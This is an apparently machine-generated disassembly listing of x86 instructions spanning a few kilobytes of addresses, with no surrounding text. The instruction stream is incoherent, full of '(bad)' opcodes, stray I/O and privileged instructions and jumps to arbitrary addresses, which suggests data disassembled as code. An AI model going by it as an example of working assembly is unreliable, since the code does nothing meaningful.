  42558a:	leave  
  42558b:	shl    BYTE PTR [ebx-0xb],1
  42558e:	sar    ah,cl
  425590:	mov    ch,0x2d
  425592:	jg     0x425566
  425594:	jmp    0x3f78815f
  425599:	cmp    al,BYTE PTR [edx+ecx*2-0x55f0f368]
  4255a0:	dec    eax
  4255a1:	repnz push ebp
  4255a3:	lea    edi,[eax-0x31]
  4255a6:	popf   
  4255a7:	(bad)  [ebx]
  4255a9:	lods   al,BYTE PTR ds:[esi]
  4255aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255ab:	mov    al,0xdb
  4255ad:	jl     0x4255b8
  4255af:	ins    BYTE PTR es:[edi],dx
  4255b0:	mov    al,0x66
  4255b2:	(bad)  [esi+0x67dfe050]
  4255b8:	push   0xffffffc9
  4255ba:	xchg   edi,eax
  4255bb:	or     cl,BYTE PTR [esi-0x10]
  4255be:	inc    esp
  4255bf:	pop    edx
  4255c0:	(bad)  
  4255c2:	and    BYTE PTR [edx+0x3475d7e5],dl
  4255c8:	rol    DWORD PTR [eax],cl
  4255ca:	jmp    0x425574
  4255cc:	dec    esi
  4255cd:	jmp    0xae75226a
  4255d2:	mov    dh,0x2d
  4255d4:	sub    ah,BYTE PTR [esi]
  4255d6:	pop    ss
  4255d7:	cmp    eax,0xac09df9b
  4255dc:	fwait
  4255dd:	ret    0xe1a2
  4255e0:	in     eax,dx
  4255e1:	mov    esi,0xdf68ae74
  4255e6:	and    DWORD PTR [esi-0x31],esp
  4255e9:	out    dx,al
  4255ea:	imul   BYTE PTR ds:0xf2a0
	...
  425654:	add    BYTE PTR [eax],al
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0x58b9f13a
  425664:	adc    al,0xbb
  425666:	addr16 xchg ecx,eax
  425668:	add    DWORD PTR [eax],eax
  42566a:	add    BYTE PTR [ecx],al
  42566c:	add    BYTE PTR [eax],al
  42566e:	shr    ecx,0x70
  425671:	retf   
  425672:	aad    0xbe
  425674:	scas   al,BYTE PTR es:[edi]
  425675:	jne    0x4256cf
  425677:	sub    DWORD PTR [ebx-0x713ed6c],ebx
  42567d:	adc    BYTE PTR [edi],0x81
  425680:	cmp    eax,0xe651c756
  425685:	aad    0x91
  425687:	mov    ch,0xb9
  425689:	(bad)  
  42568a:	mov    al,ds:0x771f8cbe
  42568f:	in     eax,dx
  425690:	sar    BYTE PTR [edi],cl
  425692:	or     dh,dh
  425694:	retf   
  425695:	jbe    0x4256ed
  425697:	push   ds
  425698:	mov    edi,0x8a9b2ed9
  42569d:	loop   0x425693
  42569f:	sbb    BYTE PTR [edi],cl
  4256a1:	pop    DWORD PTR [esi+0x2616317c]
  4256a7:	out    dx,al
  4256a8:	or     eax,0x83973976
  4256ad:	push   ebp
  4256ae:	aaa    
  4256af:	mov    esp,DWORD PTR [ebp-0x7d]
  4256b2:	xchg   esi,eax
  4256b3:	sub    eax,0x658b6a1f
  4256b8:	mov    esp,0xb67c4b25
  4256bd:	mov    DWORD PTR [ebx-0x7d3068f9],esp
  4256c3:	retf   
  4256c4:	data16 out 0x7d,al
  4256c7:	cwde   
  4256c8:	add    ah,dh
  4256ca:	or     esp,esi
  4256cc:	xor    esi,DWORD PTR [eax-0x360a1683]
  4256d2:	push   esp
  4256d3:	aaa    
  4256d4:	mov    ecx,esi
  4256d6:	mov    ah,0xfd
  4256d8:	dec    eax
  4256d9:	pop    ds
  4256da:	dec    ecx
  4256db:	cmp    dl,al
  4256dd:	stos   BYTE PTR es:[edi],al
  4256de:	xchg   ebp,eax
  4256df:	into   
  4256e0:	fwait
  4256e1:	push   edx
  4256e2:	std    
  4256e3:	mov    ecx,0x20c03143
  4256e8:	loopne 0x42574a
  4256ea:	in     al,0xaf
  4256ec:	pop    esp
  4256ed:	imul   edi,DWORD PTR [edx],0x4390846
  4256f3:	enter  0x6fe0,0x6d
  4256f7:	mov    al,ds:0xe1b45b15
  4256fc:	sbb    al,0x72
  4256fe:	call   0x5b4bd773
  425703:	clc    
  425704:	pop    esi
  425705:	push   ecx
  425706:	out    0xa6,al
  425708:	ins    DWORD PTR es:[edi],dx
  425709:	sti    
  42570a:	sbb    al,0x23
  42570c:	in     eax,dx
  42570d:	icebp  
  42570e:	ins    DWORD PTR es:[edi],dx
  42570f:	sbb    DWORD PTR [ecx-0x7e6d3251],esi
  425715:	hlt    
  425716:	pop    edx
  425717:	adc    DWORD PTR [ebx+0x179846bf],ebx
  42571d:	mov    ebx,0xe0363869
  425722:	adc    DWORD PTR [ecx+edi*2],0xfffffff3
  425726:	out    dx,al
  425727:	into   
  425728:	or     edi,DWORD PTR [eax+0x27]
  42572b:	xchg   ebp,eax
  42572c:	fisubr DWORD PTR [ecx]
  42572e:	into   
  42572f:	xor    eax,0xffffff8a
  425732:	leave  
  425733:	push   0xffffff8c
  425735:	scas   al,BYTE PTR es:[edi]
  425736:	adc    eax,0x161c0f97
  42573b:	js     0x425797
  42573d:	xor    ebp,DWORD PTR ds:0x9750b3b5
  425743:	xchg   ecx,eax
  425744:	je     0x4256d2
  425746:	cdq    
  425747:	pop    esp
  425748:	cdq    
  425749:	fxch   st(7)
  42574b:	sub    al,0xd
  42574d:	cli    
  42574e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42574f:	jl     0x42577a
  425751:	js     0x42575d
  425753:	push   ds
  425754:	push   ecx
  425755:	jns    0x4256fe
  425757:	mov    ah,0x82
  425759:	imul   esi,DWORD PTR [edi-0x790a718d],0xffffff85
  425760:	jmp    0xef145463
  425765:	(bad)  
  425766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425767:	cmp    esi,esp
  425769:	test   BYTE PTR [ebx+0x8b2bd4],bl
	...
  4257d3:	add    BYTE PTR [eax],al
  4257d5:	add    dh,dl
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0x70c79774
  4257e5:	(bad)  
  4257e6:	addr16 xchg edx,eax
  4257e8:	add    DWORD PTR [eax],eax
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	inc    ecx
  4257ef:	mov    BYTE PTR [esi-0x7d20cb7f],0x11
  4257f6:	mov    esp,0xcaf9792b
  4257fb:	jb     0x4257ef
  4257fd:	ins    BYTE PTR es:[edi],dx
  4257fe:	mov    ch,0xde
  425800:	fadd   QWORD PTR [eax+0x38a8fa2d]
  425806:	pop    edx
  425807:	cmp    bl,ch
  425809:	cdq    
  42580a:	xor    al,0x31
  42580c:	fcmovu st,st(2)
  42580e:	mov    ecx,0x2603f284
  425813:	and    dl,BYTE PTR [eax+0x383ff810]
  425819:	jge    0x42580b
  42581b:	icebp  
  42581c:	jb     0x425820
  42581e:	sub    ebx,DWORD PTR [esi+0xe]
  425821:	xor    bl,al
  425823:	sub    ebp,DWORD PTR ds:0x7284d744
  425829:	std    
  42582a:	mov    esp,0x8b04bcd1
  42582f:	push   esi
  425830:	or     BYTE PTR [esi+0x7c],ah
  425833:	or     al,0x79
  425835:	popf   
  425836:	aad    0x48
  425838:	push   ebp
  425839:	sbb    edx,edx
  42583b:	xor    bl,cl
  42583d:	lods   al,BYTE PTR gs:[esi]
  42583f:	push   es
  425840:	pop    esp
  425841:	das    
  425842:	mov    dl,0xa2
  425844:	cmovs  eax,esp
  425847:	add    eax,0xcec8704e
  42584c:	mov    al,ds:0x1fc427ac
  425851:	push   edi
  425852:	out    0xe8,eax
  425854:	jo     0x425869
  425856:	adc    DWORD PTR [ecx],0xffffffd1
  425859:	pusha  
  42585a:	fcomp  st(7)
  42585c:	xor    dh,0x1f
  42585f:	pop    ebx
  425860:	ret    
  425861:	leave  
  425862:	mov    cl,0x57
  425864:	imul   edi,DWORD PTR [ebx],0x23
  425867:	mov    ah,0x1c
  425869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42586a:	inc    ecx
  42586b:	pop    ss
  42586c:	mov    ebp,0xa59df5c4
  425871:	fcmovbe st,st(7)
  425873:	test   bl,cl
  425875:	aaa    
  425876:	repz push ecx
  425878:	loop   0x425837
  42587a:	push   ebx
  42587b:	rol    DWORD PTR [ebx+ecx*8-0xfc6ec84],1
  425882:	mov    ds:0xd108a811,eax
  425887:	inc    esi
  425888:	cmp    cl,BYTE PTR [edx]
  42588a:	inc    eax
  42588b:	inc    ebx
  42588c:	sub    al,0xbb
  42588e:	mov    al,0x2e
  425890:	mov    al,ds:0x9eb515e1
  425895:	cli    
  425896:	inc    eax
  425897:	stos   BYTE PTR es:[edi],al
  425898:	(bad)  
  425899:	cwde   
  42589a:	in     al,dx
  42589b:	lods   al,BYTE PTR ds:[esi]
  42589c:	fldenv [ecx-0x58d7232d]
  4258a2:	arpl   bx,dx
  4258a4:	popa   
  4258a5:	je     0x425863
  4258a7:	xlat   BYTE PTR ds:[ebx]
  4258a8:	xor    ebx,DWORD PTR [esi+eiz*1]
  4258ab:	loope  0x4258f7
  4258ad:	and    BYTE PTR [ebp+eiz*4-0x624c1358],ch
  4258b4:	sub    al,BYTE PTR [edi-0x11]
  4258b7:	loope  0x4258d7
  4258b9:	mov    eax,ds:0xff9d7a18
  4258be:	ja     0x4258b7
  4258c0:	pop    ss
  4258c1:	imul   esi,eax,0x712679db
  4258c7:	(bad)  
  4258c8:	mov    al,0xd2
  4258ca:	pop    ecx
  4258cb:	out    dx,eax
  4258cc:	ret    
  4258cd:	push   ebx
  4258ce:	mov    edx,0x6727aebf
  4258d3:	pop    esp
  4258d4:	clc    
  4258d5:	lods   eax,DWORD PTR ds:[esi]
  4258d6:	call   0x2cfe:0xb91a267b
  4258dd:	mov    gs,WORD PTR [edx+0x1467d00a]
  4258e3:	fimul  DWORD PTR [edx]
  4258e5:	fstp   DWORD PTR [ecx]
  4258e7:	xchg   edi,esp
  4258e9:	arpl   WORD PTR ds:0x684ba0,ax
	...
  425953:	add    BYTE PTR [eax],al
  425955:	add    BYTE PTR [edx+edx*2-0x70],bl
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	rcl    DWORD PTR [ecx-0x6c984611],1
  425968:	add    DWORD PTR [eax],eax
  42596a:	add    BYTE PTR [ecx],al
  42596c:	add    BYTE PTR [eax],al
  42596e:	popa   
  42596f:	into   
  425970:	int    0x91
  425972:	sbb    DWORD PTR [ecx],0xffffff93
  425975:	and    esp,DWORD PTR [esi]
  425977:	xchg   ebx,eax
  425978:	jno    0x425951
  42597a:	push   ecx
  42597b:	pop    ebp
  42597c:	aad    0xd0
  42597e:	sub    DWORD PTR [ebx+0x1d],eax
  425981:	pop    eax
  425982:	add    esp,DWORD PTR [eax]
  425984:	fild   QWORD PTR [ecx-0x3cbf4a0]
  42598a:	div    ebp
  42598c:	fsub   DWORD PTR [eax-0x25]
  42598f:	sub    eax,DWORD PTR [edx-0x7bf3c642]
  425995:	lods   al,BYTE PTR ds:[esi]
  425996:	xchg   esp,eax
  425997:	les    ebx,FWORD PTR [esi-0x70199aab]
  42599d:	pop    ecx
  42599e:	ret    0xb5ee
  4259a1:	xlat   BYTE PTR ss:[ebx]
  4259a3:	cld    
  4259a4:	lea    esp,[ebp-0x6]
  4259a7:	mov    cl,0x4
  4259a9:	sub    al,0xd6
  4259ab:	or     eax,0xc00346b9
  4259b0:	inc    edx
  4259b1:	sub    DWORD PTR [edx],esi
  4259b3:	and    dl,BYTE PTR [edx+0x21]
  4259b6:	arpl   WORD PTR ds:0xde3d9c35,dx
  4259bc:	(bad)  
  4259bd:	(bad)  
  4259be:	xchg   esp,eax
  4259bf:	inc    eax
  4259c0:	jae    0x42598f
  4259c2:	cmp    DWORD PTR [eax],esp
  4259c4:	add    BYTE PTR [esi-0x3a8ec6c2],0x27
  4259cb:	neg    DWORD PTR [ecx-0x43805cf8]
  4259d1:	inc    edi
  4259d2:	inc    ebx
  4259d3:	xchg   esp,eax
  4259d4:	push   edi
  4259d5:	inc    eax
  4259d6:	or     DWORD PTR [eax],edi
  4259d8:	inc    ebp
  4259d9:	dec    esi
  4259da:	and    DWORD PTR [esi+edx*1],0xd34f06e
  4259e1:	icebp  
  4259e2:	sbb    edx,DWORD PTR [esi+0x44b6d70d]
  4259e8:	fwait
  4259e9:	test   edi,ecx
  4259eb:	cs icebp 
  4259ed:	dec    eax
  4259ee:	lea    esi,[edx]
  4259f0:	retf   
  4259f1:	test   DWORD PTR [ebx+ebx*2],ebx
  4259f4:	sub    al,0x84
  4259f6:	jns    0x42599a
  4259f8:	in     al,dx
  4259f9:	dec    ecx
  4259fa:	pop    eax
  4259fb:	cmc    
  4259fc:	add    DWORD PTR [edx-0x58],0x8442cf26
  425a03:	sbb    ch,al
  425a05:	fwait
  425a06:	stc    
  425a07:	nop
  425a08:	push   0xd9d15eaf
  425a0d:	cmp    esp,DWORD PTR [ecx]
  425a0f:	stos   BYTE PTR es:[edi],al
  425a10:	pop    es
  425a11:	mov    al,ds:0xe7664d9b
  425a16:	and    edi,DWORD PTR [eax-0x11]
  425a19:	push   eax
  425a1a:	dec    edx
  425a1b:	xor    eax,0x6d8e09bd
  425a20:	les    eax,FWORD PTR [edi]
  425a22:	mov    DWORD PTR [ecx],edi
  425a24:	pop    eax
  425a25:	or     ebx,DWORD PTR [edx-0x3f]
  425a28:	xchg   esi,eax
  425a29:	and    edi,DWORD PTR [edx+0x11fe2d20]
  425a2f:	xchg   DWORD PTR ds:0xb7a8af05,esi
  425a35:	cmp    BYTE PTR [ebp+0x7d132e47],dh
  425a3b:	mov    ecx,ecx
  425a3d:	pop    eax
  425a3e:	sti    
  425a3f:	inc    ebx
  425a40:	inc    ebx
  425a41:	mov    bh,0xf8
  425a43:	sbb    BYTE PTR [eax+0x7b],dl
  425a46:	fnsave [edx]
  425a48:	das    
  425a49:	xor    BYTE PTR [eax+0x57f98416],0xd5
  425a50:	xchg   esp,eax
  425a51:	jecxz  0x4259ff
  425a53:	fdivr  DWORD PTR [edx-0x50120a61]
  425a59:	dec    ecx
  425a5a:	shl    DWORD PTR [ecx],cl
  425a5c:	mov    eax,ds:0x7ea1fe94
  425a61:	enter  0xff13,0x1d
  425a65:	mov    edi,0xbd6f5103
  425a6a:	add    esi,DWORD PTR fs:[edx+0x59]
	...
  425ad5:	add    cl,al
  425ad7:	arpl   WORD PTR [edi+eiz*2],ax
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x63601d90]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  425af0:	mov    al,ds:0x75593bb8
  425af5:	sbb    DWORD PTR [edx],eax
  425af7:	pop    esi
  425af8:	shl    DWORD PTR [ebx+0x56],1
  425afb:	out    dx,eax
  425afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425afd:	jnp    0x425ac0
  425aff:	in     eax,dx
  425b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b01:	dec    ebx
  425b02:	and    DWORD PTR [ecx-0x1f],0xffffffb0
  425b06:	dec    edi
  425b07:	push   0x44
  425b09:	or     BYTE PTR [esi],ah
  425b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b0c:	cdq    
  425b0d:	stos   DWORD PTR es:[edi],eax
  425b0e:	jns    0x425ad7
  425b10:	jns    0x425aa7
  425b12:	sub    dh,BYTE PTR [edi+0x4f]
  425b15:	xor    eax,0x76f9eb04
  425b1a:	xchg   esp,eax
  425b1b:	mov    DWORD PTR ss:[esi+0x4f],edx
  425b1f:	sar    BYTE PTR [esi+0x7e],cl
  425b22:	inc    esp
  425b23:	xchg   esp,eax
  425b24:	sub    DWORD PTR [edx-0xc558d33],edi
  425b2a:	rol    DWORD PTR [eax+ebx*8+0x64],1
  425b2e:	lock cs jg 0x425b72
  425b32:	sub    esp,edx
  425b34:	pop    es
  425b35:	jg     0x425abc
  425b37:	ret    0xb599
  425b3a:	int    0x5b
  425b3c:	data16 jo 0x425b31
  425b3f:	dec    ebp
  425b40:	cmc    
  425b41:	into   
  425b42:	jbe    0x425b58
  425b44:	pop    ebx
  425b45:	cs push esi
  425b47:	fdiv   DWORD PTR [ecx-0x31]
  425b4a:	xor    al,0x30
  425b4c:	sahf   
  425b4d:	xchg   esi,eax
  425b4e:	mov    dh,0x4
  425b50:	sub    dh,0x55
  425b53:	out    0x3,al
  425b55:	mov    ch,0x40
  425b57:	ret    
  425b58:	fimul  WORD PTR [ebp-0x3ff1b269]
  425b5e:	mov    al,ds:0x496527e
  425b63:	es inc ecx
  425b65:	icebp  
  425b66:	adc    edx,DWORD PTR [edi+0x6d]
  425b69:	or     ah,BYTE PTR ds:0x103f5707
  425b6f:	int3   
  425b70:	ficomp DWORD PTR [eax+0x6a]
  425b73:	lods   al,BYTE PTR ds:[esi]
  425b74:	addr16 lock inc ebx
  425b77:	rol    esi,cl
  425b79:	pop    edx
  425b7a:	cmc    
  425b7b:	pop    esi
  425b7c:	pushf  
  425b7d:	ffree  st(4)
  425b7f:	or     ah,BYTE PTR [esi+0x6c]
  425b82:	inc    ebp
  425b83:	int3   
  425b84:	repz adc al,bh
  425b87:	call   DWORD PTR [edx-0x65]
  425b8a:	jnp    0x425b24
  425b8c:	jle    0x425bf5
  425b8e:	add    al,0xce
  425b90:	or     al,0xde
  425b92:	or     al,0xec
  425b94:	mov    bl,BYTE PTR [edi]
  425b96:	pop    DWORD PTR [eax]
  425b98:	mov    ch,0xa0
  425b9a:	lock xchg ecx,eax
  425b9c:	inc    edx
  425b9d:	cmp    BYTE PTR ds:0xece806e5,bh
  425ba3:	add    eax,0xc4b3f6c
  425ba8:	inc    edi
  425ba9:	push   esp
  425baa:	xchg   esi,eax
  425bab:	stos   BYTE PTR es:[edi],al
  425bac:	stc    
  425bad:	retf   
  425bae:	pusha  
  425baf:	lock retf 0x6056
  425bb3:	imul   esp,ecx,0xaf9108f
  425bb9:	mov    DWORD PTR ds:[ecx+0x3e43d691],ecx
  425bc0:	inc    edx
  425bc1:	push   eax
  425bc2:	jnp    0x425c3c
  425bc4:	and    al,0x1b
  425bc6:	and    dh,bh
  425bc8:	xchg   ecx,eax
  425bc9:	jne    0x425c1d
  425bcb:	loope  0x425bb7
  425bcd:	mov    DWORD PTR [ebx],ebx
  425bcf:	add    DWORD PTR [ecx],edx
  425bd1:	jb     0x425b6a
  425bd3:	std    
  425bd4:	into   
  425bd5:	int    0x9b
  425bd7:	test   eax,0x29cd07af
  425bdc:	inc    ecx
  425bdd:	cli    
  425bde:	das    
  425bdf:	cmp    BYTE PTR [edx],0xe4
  425be2:	test   al,0xb6
  425be4:	adc    al,0xdf
  425be6:	push   esi
  425be7:	repz sub BYTE PTR ds:0x1a517d91,dh
	...
  425c56:	(bad)  
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	(bad)  
  425c63:	dec    eax
  425c64:	pop    ecx
  425c65:	in     al,0x67
  425c67:	xchg   ebp,eax
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	add    BYTE PTR [ecx],al
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	sub    BYTE PTR ds:0xe76be485,0x13
  425c75:	stc    
  425c76:	inc    edi
  425c77:	test   DWORD PTR [eax],edx
  425c79:	mov    ebx,0xae684ec8
  425c7e:	cs xchg edx,eax
  425c80:	dec    ebx
  425c81:	and    al,0xa7
  425c83:	dec    esi
  425c84:	data16 and BYTE PTR [ebp-0x30],ah
  425c88:	mov    ah,0xa6
  425c8a:	cmc    
  425c8b:	(bad)  
  425c8c:	jp     0x425c7c
  425c8e:	add    cl,dl
  425c90:	lods   al,BYTE PTR ds:[esi]
  425c91:	pop    edx
  425c92:	or     DWORD PTR [edi+0x77],esi
  425c95:	adc    BYTE PTR [ebx],0x77
  425c98:	dec    ecx
  425c99:	inc    edx
  425c9a:	or     eax,0x85b86410
  425c9f:	stos   DWORD PTR es:[edi],eax
  425ca0:	hlt    
  425ca1:	dec    ebp
  425ca2:	and    bl,dh
  425ca4:	(bad)  
  425ca5:	aas    
  425ca6:	sub    edi,DWORD PTR [eax+ebx*2-0x60e6eac4]
  425cad:	push   0x383cba76
  425cb2:	aad    0x61
  425cb4:	xchg   ecx,eax
  425cb5:	mov    bl,0x22
  425cb7:	xchg   ebx,eax
  425cb8:	out    dx,al
  425cb9:	retf   
  425cba:	out    0x72,eax
  425cbc:	and    DWORD PTR [ebp-0x34],esi
  425cbf:	ss pop edi
  425cc1:	mov    bh,dl
  425cc3:	adc    dh,BYTE PTR ds:0x67fe41b7
  425cc9:	mov    ebx,0xb8b32320
  425cce:	dec    ebp
  425ccf:	mov    al,0x2b
  425cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425cd2:	push   cs
  425cd3:	aad    0x2
  425cd5:	sbb    al,BYTE PTR [eax+0x6d97896]
  425cdb:	aaa    
  425cdc:	dec    ebx
  425cdd:	adc    BYTE PTR [edx+0x61581262],bl
  425ce3:	inc    esp
  425ce4:	imul   ebx,esp,0x74efd936
  425cea:	cwde   
  425ceb:	add    DWORD PTR [ebp+0x37],eax
  425cee:	mov    eax,ds:0xfd67d8e5
  425cf3:	or     eax,0x3cef18c6
  425cf8:	pop    ebp
  425cf9:	arpl   WORD PTR [ebx-0x10deaa3f],dx
  425cff:	mov    al,ds:0xb8693b5e
  425d04:	jbe    0x425d60
  425d06:	push   ecx
  425d07:	inc    esi
  425d08:	aaa    
  425d09:	loopne 0x425d20
  425d0b:	xor    edx,0xffffffcb
  425d0e:	fisttp WORD PTR [ebx]
  425d10:	aad    0x59
  425d12:	frstor [ebx]
  425d14:	mov    ah,ch
  425d16:	mov    cl,0xc9
  425d18:	(bad)  
  425d1a:	dec    ebp
  425d1b:	dec    ecx
  425d1c:	(bad)  
  425d1d:	xchg   ebx,eax
  425d1e:	dec    eax
  425d1f:	sub    DWORD PTR [ecx],ebp
  425d21:	fild   WORD PTR [edi]
  425d23:	dec    esp
  425d24:	ror    BYTE PTR [eax],1
  425d26:	push   DWORD PTR [edi+0x407a9968]
  425d2c:	adc    DWORD PTR [ecx],eax
  425d2e:	clc    
  425d2f:	xor    al,0xfe
  425d31:	mul    esi
  425d33:	out    0x88,eax
  425d35:	mov    ecx,0x1fe471a4
  425d3a:	jl     0x425d48
  425d3c:	lahf   
  425d3d:	mov    eax,0xa479392f
  425d42:	mov    bh,0x5f
  425d44:	push   ss
  425d45:	pop    esp
  425d46:	and    edx,ebx
  425d48:	pop    esp
  425d49:	inc    ecx
  425d4a:	cdq    
  425d4b:	adc    eax,0xe874b9c2
  425d50:	ins    BYTE PTR es:[edi],dx
  425d51:	jae    0x425d28
  425d53:	inc    eax
  425d54:	(bad)  
  425d55:	pop    esi
  425d56:	adc    ecx,DWORD PTR [ebx-0x5d72f1d2]
  425d5c:	repnz cmp BYTE PTR [ebx+0x5280542b],ch
  425d63:	ja     0x425d8f
  425d65:	and    ecx,DWORD PTR [eax+0x3f476711]
  425d6b:	pop    edi
  425d6c:	pusha  
  425d6d:	inc    ebp
	...
  425dd6:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0x198f66e7,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	jge    0x425e57
  425df0:	arpl   WORD PTR [ecx],si
  425df2:	sbb    eax,0x5fa5a0b5
  425df7:	pop    es
  425df8:	ror    DWORD PTR [esi],cl
  425dfa:	mov    ds:0x6fa55117,al
  425dff:	mov    ebp,esi
  425e01:	adc    al,BYTE PTR [ebp+0x6d3dd27e]
  425e07:	in     eax,0x7e
  425e09:	mov    ah,0x82
  425e0b:	pop    es
  425e0c:	push   cs
  425e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e0e:	dec    ecx
  425e0f:	dec    eax
  425e10:	adc    ebx,ecx
  425e12:	fcom   DWORD PTR [eax+0x6c]
  425e15:	test   eax,0x93657fce
  425e1a:	push   esp
  425e1b:	cmp    ah,BYTE PTR [edi-0xc625046]
  425e21:	or     BYTE PTR [edi-0x27c46e58],bl
  425e27:	out    0x2c,eax
  425e29:	jnp    0x425e34
  425e2b:	xchg   ebp,eax
  425e2c:	test   eax,0xca99d86c
  425e31:	add    dl,dh
  425e33:	outs   dx,BYTE PTR ds:[esi]
  425e34:	add    ebx,DWORD PTR [ebp+ebx*8-0x3f238d36]
  425e3b:	fcom   QWORD PTR [edx+eiz*2]
  425e3e:	out    dx,al
  425e3f:	lock xor eax,DWORD PTR [edx+0x3b3407a5]
  425e46:	aam    0x38
  425e48:	or     al,ch
  425e4a:	das    
  425e4b:	or     eax,0xe5d33ec2
  425e50:	int3   
  425e51:	lahf   
  425e52:	test   BYTE PTR [esi+0x5f],0xf7
  425e56:	aas    
  425e57:	ds and al,0xd1
  425e5a:	adc    edx,DWORD PTR [ebp+0x49]
  425e5d:	add    al,0x31
  425e5f:	test   BYTE PTR [edx-0x491bbebb],cl
  425e65:	pop    ebp
  425e66:	push   esp
  425e67:	loop   0x425df3
  425e69:	xchg   ebx,eax
  425e6a:	imul   eax,DWORD PTR [esi+ebp*8-0x32],0x38
  425e6f:	mov    eax,ds:0x9d926ed2
  425e74:	call   0x57c4b8bc
  425e79:	cld    
  425e7a:	xchg   ebp,eax
  425e7b:	addr16 pop ebx
  425e7d:	push   ebp
  425e7e:	cdq    
  425e7f:	sub    eax,0x8f05d612
  425e84:	fstp   QWORD PTR [esi]
  425e86:	mov    ebx,0x704c91ca
  425e8b:	or     DWORD PTR [ebx],ebx
  425e8d:	xchg   BYTE PTR [edi-0x187e4eda],ch
  425e93:	ror    DWORD PTR [ebp-0x61d22960],cl
  425e99:	xor    ch,BYTE PTR [esi]
  425e9b:	sub    dh,bh
  425e9d:	fwait
  425e9e:	int    0xe7
  425ea0:	jnp    0x425e8a
  425ea2:	lahf   
  425ea3:	inc    edx
  425ea4:	leave  
  425ea5:	call   0x2759dd47
  425eaa:	push   0xffffffd0
  425eac:	shr    BYTE PTR [edi-0x2a],1
  425eaf:	inc    edx
  425eb0:	push   ss
  425eb1:	lods   al,BYTE PTR ds:[esi]
  425eb2:	out    dx,al
  425eb3:	xor    ecx,DWORD PTR [ebx+0x18be8829]
  425eb9:	push   ecx
  425eba:	adc    al,0x55
  425ebc:	add    al,bl
  425ebe:	jge    0x425ee8
  425ec0:	sbb    bl,BYTE PTR [ecx]
  425ec2:	lahf   
  425ec3:	shl    edi,cl
  425ec5:	cs jno 0x425ebb
  425ec8:	push   ebx
  425ec9:	jmp    FWORD PTR [ebx+0x4916c371]
  425ecf:	cld    
  425ed0:	or     eax,0x7e3bc2c7
  425ed5:	xor    DWORD PTR [eax-0x2a8c6674],esp
  425edb:	mov    ds:0xcdc2804a,eax
  425ee0:	mov    ds:0x8540b87,al
  425ee5:	xchg   ebx,eax
  425ee6:	into   
  425ee7:	or     eax,ebp
  425ee9:	and    al,0x26
  425eeb:	xchg   DWORD PTR [eax],edx
  425eed:	xor    eax,DWORD PTR [eax]
	...
  425f53:	add    BYTE PTR [eax],al
  425f55:	add    dh,al
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	pop    edi
  425f63:	aam    0x84
  425f65:	xchg   ecx,eax
  425f66:	addr16 xchg edi,eax
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	add    BYTE PTR [ecx],al
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	ret    0xaa08
  425f71:	pop    ds
  425f72:	push   edx
  425f73:	test   eax,0x745857a3
  425f78:	icebp  
  425f79:	inc    esi
  425f7a:	and    eax,0xb959c288
  425f7f:	or     BYTE PTR ds:0x4c156e7,ch
  425f85:	int3   
  425f86:	mov    al,ds:0x38bfedd1
  425f8b:	cmp    BYTE PTR [ebx+0x31],ah
  425f8e:	out    dx,eax
  425f8f:	aad    0xc
  425f91:	clc    
  425f92:	push   0xffffff9d
  425f94:	lahf   
  425f95:	cli    
  425f96:	mov    edx,0x6ac2b104
  425f9b:	addr16 mov edx,0x86650cc9
  425fa1:	in     eax,dx
  425fa2:	inc    edi
  425fa3:	ret    
  425fa4:	mov    ds:0x6cf3f992,al
  425fa9:	adc    dl,0xc
  425fac:	mov    al,0xb7
  425fae:	mov    bh,0x15
  425fb0:	iret   
  425fb1:	xor    ecx,DWORD PTR [edi-0x4b33be8d]
  425fb7:	xor    bh,0x67
  425fba:	fcom   DWORD PTR [ecx+0xd4b2562]
  425fc0:	inc    ebx
  425fc1:	cmc    
  425fc2:	mov    edi,DWORD PTR ds:0x2bd0ec26
  425fc8:	inc    ebx
  425fc9:	adc    al,0xe1
  425fcb:	imul   BYTE PTR [ebx]
  425fcd:	jmp    0x5bc18500
  425fd2:	pop    ss
  425fd3:	xlat   BYTE PTR ds:[ebx]
  425fd4:	mov    bl,0x3f
  425fd6:	or     BYTE PTR [eax-0x5ebaa481],al
